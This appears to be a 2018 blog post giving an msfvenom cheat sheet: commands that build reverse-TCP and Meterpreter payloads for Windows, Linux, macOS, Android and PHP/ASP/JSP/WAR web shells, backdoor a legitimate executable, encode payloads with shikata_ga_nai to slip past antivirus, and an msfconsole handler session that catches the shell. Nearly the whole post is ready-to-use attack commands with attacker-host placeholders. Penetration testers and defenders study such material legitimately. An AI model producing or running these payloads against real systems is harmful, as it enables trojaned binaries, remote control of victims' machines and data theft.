---
layout: post
title: Msfvenom Cheat Sheet
date: 2018-07-24 18:58 -0300
categories: [cheatsheet, offensive_security]
tags: [ offensive security, cheat sheet, reverse shell, backdoor, bash, perl, python, PHP]
---

![Image of msfconsole](/uploads/Screenshot%20from%202018-07-25%2001-11-02.png)

MsfVenom is a Metasploit standalone payload generator as a replacement for msfpayload and msfencode.

## Binaries

| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe | Creates a simple TCP Payload for Windows |
|msfvenom -p windows/meterpreter/reverse_http LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe | Creates a simple HTTP Payload for Windows |
|msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f elf > example.elf | Creates a simple TCP Shell for Linux |
|msfvenom -p osx/x86/shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f macho > example.macho | Creates a simple TCP Shell for Mac |
|msfvenom -p android/meterpreter/reverse/tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} R > example.apk | Creats a simple TCP Payload for Android |

<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-0255642880549652"
     data-ad-slot="6407748687"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

## Web Payloads

| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.php | Creats a Simple TCP Shell for PHP |
|msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp > example.asp | Creats a Simple TCP Shell for ASP |
|msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp | Creats a Simple TCP Shell for Javascript |
|msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war | Creats a Simple TCP Shell for WAR |

## Windows Payloads

| Command       | Info           |
| ------------- |:-------------:|
|msfvenom -l encoders | Lists all avalaible encoders|
|msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe | Binds an exe with a Payload (Backdoors an exe) | 
|msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe > example.exe | Creates a simple TCP payload with shikata_ga_nai encoder |
|msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe > example.exe | Binds an exe with a Payload and encodes it |

### How do I get the meterprater shell?

```bash
nli@nlistation:~$ sudo msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
```